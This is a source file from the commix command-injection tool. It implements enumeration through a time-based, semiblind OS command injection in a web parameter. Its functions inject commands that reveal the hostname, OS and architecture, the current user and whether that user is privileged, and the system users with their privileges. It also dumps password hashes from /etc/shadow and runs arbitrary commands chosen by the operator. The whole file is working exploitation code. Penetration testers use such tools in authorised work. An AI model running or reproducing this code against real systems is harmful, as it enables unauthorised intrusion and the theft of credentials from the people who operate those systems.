#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector

"""
The "tempfile-based" injection technique on Semiblind OS Command Injection.
__Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

"""
Hostname enumeration
"""
def hostname(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  if settings.TARGET_OS == "win":
    settings.HOSTNAME = settings.WIN_HOSTNAME 
  cmd = settings.HOSTNAME
  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
  shell = output 
  if shell:
    shell = "".join(str(p) for p in output)
    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
    sys.stdout.flush()
    # Add infos to logs file. 
    output_file = open(filename, "a")
    output_file.write("    (!) The hostname is " + shell + ".\n")
    output_file.close()

"""
Retrieve system information
"""
def system_information(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):     
  if settings.TARGET_OS == "win":
    settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
  cmd = settings.RECOGNISE_OS        
  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
  target_os = output 
  if target_os:
    print ""
    target_os = "".join(str(p) for p in target_os)
    if settings.TARGET_OS == "win":
      cmd = settings.WIN_RECOGNISE_HP
    else:
      cmd = settings.RECOGNISE_HP
    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    target_arch = output 
    if target_arch:
      if menu.options.verbose:
        print ""
      target_arch = "".join(str(p) for p in target_arch)
      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
      sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) The target operating system is " + target_os)
      output_file.write(" and the hardware platform is " + target_arch + ".\n")
      output_file.close()

"""
The current user enumeration
"""
def current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  if settings.TARGET_OS == "win":
    settings.CURRENT_USER = settings.WIN_CURRENT_USER
  cmd = settings.CURRENT_USER
  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
  cu_account = output 
  if cu_account:
    print ""
    cu_account = "".join(str(p) for p in cu_account)
    # Check if the user have super privileges.
    if menu.options.is_root or menu.options.is_admin:
      if settings.TARGET_OS == "win":
        cmd = settings.IS_ADMIN
      else:  
        cmd = settings.IS_ROOT 
      check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
      shell = output 
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
      # Add infos to logs file.    
      output_file = open(filename, "a")
      output_file.write("    (!) The current user is " + cu_account)
      output_file.close()
      if shell:
        shell = "".join(str(p) for p in shell)
        if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
           (settings.TARGET_OS != "win" and shell != "0"):
          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write(" and it is not privileged.\n")
          output_file.close()
        else:
          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + Style.RESET_ALL + Style.BRIGHT + "privileged" + Style.RESET_ALL + ".\n")
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write(" and it is privileged.\n")
          output_file.close()
    else:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
      sys.stdout.flush()
      # Add infos to logs file.   
      output_file = open(filename, "a")
      output_file.write("    (!) The current user is " + cu_account + "\n")
      output_file.close()

"""
System users enumeration
"""
def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response): 
  if settings.TARGET_OS == "win":
    settings.SYS_USERS = settings.WIN_SYS_USERS
    settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
    # URL encode "+" if POST request and python alternative shell. 
    if alter_shell and http_request_method == "POST":
      settings.SYS_USERS = settings.SYS_USERS.replace("+","%2B")
  cmd = settings.SYS_USERS             
  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
  sys_users = output 
  # Windows users enumeration.
  if settings.TARGET_OS == "win":
    if menu.options.verbose:
      print ""
    sys.stdout.write("\n(*) Executing the 'net users' command to enumerate users entries... ")
    sys.stdout.flush()
    try:
      if sys_users[0] :
        sys_users = "".join(str(p) for p in sys_users).strip()
        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
        sys_users_list = re.findall(r"(.*)", sys_users)
        sys_users_list = "".join(str(p) for p in sys_users_list).strip()
        sys_users_list = ' '.join(sys_users_list.split())
        sys_users_list = sys_users_list.split()
        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " via 'net users' command.\n" + Style.RESET_ALL)
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in via 'net users' command.\n")
        output_file.close()
        count = 0
        for user in range(0, len(sys_users_list)):
          count = count + 1
          if menu.options.privileges:
            print "(*) Confirming privileges of user '" + sys_users_list[user] + "'... "
            cmd = "powershell.exe write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','').substring(0,6)"
            if alter_shell:
              cmd = cmd.replace("'","\\'")
            check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
            check_privs = output 
            check_privs = "".join(str(p) for p in check_privs).strip()
            check_privs = re.findall(r"(.*)", check_privs)
            check_privs = "".join(str(p) for p in check_privs).strip()
            check_privs = check_privs.split()
            if "Admin" in check_privs[0]:
              is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " admin user"
              is_privileged_nh = " is admin user "
            else:
              is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user"
              is_privileged_nh = " is regular user "
          else :
            is_privileged = ""
            is_privileged_nh = ""
          if menu.options.verbose:
            print ""
          print "\n  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "." 
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write("      (" +str(count)+ ") " + sys_users_list[user] + is_privileged + ".\n" )
          output_file.close()
      else:
        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
        sys.stdout.flush()
        print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL  
    except TypeError:
      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
      sys.stdout.flush()
      pass
  # Unix-like users enumeration.   
  else:
    sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
    sys.stdout.flush()
    if sys_users[0] :
      sys_users = "".join(str(p) for p in sys_users).strip()
      if len(sys_users.split(" ")) <= 1 :
        sys_users = sys_users.split("\n")
      else:
        sys_users = sys_users.split(" ")
      # Check for appropriate '/etc/passwd' format.
      if len(sys_users) % 3 != 0 :
        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
        sys.stdout.flush()
        print "\n" + Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
        sys_users = " ".join(str(p) for p in sys_users).strip()
        print sys_users
        output_file = open(filename, "a")
        output_file.write("      " + sys_users)
        output_file.close()
      else:  
        sys_users_list = []
        for user in range(0, len(sys_users), 3):
           sys_users_list.append(sys_users[user : user + 3])
        if len(sys_users_list) != 0 :
          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
          sys.stdout.flush()
          # Add infos to logs file.   
          output_file = open(filename, "a")
          output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n")
          output_file.close()
          count = 0
          for user in range(0, len(sys_users_list)):
            sys_users = sys_users_list[user]
            sys_users = ":".join(str(p) for p in sys_users)
            if menu.options.verbose:
              print ""
            count = count + 1
            fields = sys_users.split(":")
            fields1 = "".join(str(p) for p in fields)
            # System users privileges enumeration
            try:
              if not fields[2].startswith("/"):
                raise ValueError()
              if menu.options.privileges:
                if int(fields[1]) == 0:
                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
                  is_privileged_nh = " is root user "
                elif int(fields[1]) > 0 and int(fields[1]) < 99 :
                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
                  is_privileged_nh = " is system user "
                elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
                  if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
                    is_privileged_nh = " is anonymous user "
                  elif int(fields[1]) == 60002:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
                    is_privileged_nh = " is non-trusted user "   
                  else:
                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
                    is_privileged_nh = " is regular user "
                else :
                  is_privileged = ""
                  is_privileged_nh = ""
              else :
                is_privileged = ""
                is_privileged_nh = ""
              print "  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
              # Add infos to logs file.   
              output_file = open(filename, "a")
              output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
              output_file.close()
            except ValueError:
              if count == 1 :
                print Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
              sys_users = " ".join(str(p) for p in sys_users.split(":"))
              print sys_users 
              output_file = open(filename, "a")
              output_file.write("      " + sys_users)
              output_file.close()
    else:
      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
      sys.stdout.flush()
      print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   

"""
System passwords enumeration
"""
def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):     
  if settings.TARGET_OS == "win":
    # Not yet implemented!
    pass
  else:
    cmd = settings.SYS_PASSES     
    print ""       
    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    sys_passes = output 
    if sys_passes :
      sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
      sys.stdout.flush()
      sys_passes = "".join(str(p) for p in sys_passes)
      sys_passes = sys_passes.replace(" ", "\n")
      sys_passes = sys_passes.split( )
      if len(sys_passes) != 0 :
        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
        sys.stdout.flush()
        # Add infos to logs file.   
        output_file = open(filename, "a")
        output_file.write("\n    (!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" )
        output_file.close()
        count = 0
        for line in sys_passes:
          count = count + 1
          try:
            fields = line.split(":")
            if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
              print "  (" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
              # Add infos to logs file.   
              output_file = open(filename, "a")
              output_file.write("      (" +str(count)+ ") " + fields[0] + " : " + fields[1])
              output_file.close()
          # Check for appropriate '/etc/shadow' format.
          except IndexError:
            if count == 1 :
              sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
            print fields[0]
            output_file = open(filename, "a")
            output_file.write("      " + fields[0])
            output_file.close()
      else:
        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
        sys.stdout.flush()
        print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL

"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  cmd = menu.options.os_cmd
  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
  return check_how_long, output

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  if settings.ENUMERATION_DONE == False:
    print ""
  
  if menu.options.hostname:
    hostname(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    settings.ENUMERATION_DONE = True

  if menu.options.current_user: 
    if settings.ENUMERATION_DONE == True:
      print ""
    current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    if settings.ENUMERATION_DONE == True:
      print ""
    system_information(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

  if menu.options.users:
    if settings.ENUMERATION_DONE == True:
      print ""
    system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    if settings.ENUMERATION_DONE == True:
      print ""
    system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
    if settings.ENUMERATION_DONE == False:
      settings.ENUMERATION_DONE = True

  if settings.ENUMERATION_DONE == True:
    print ""

# eof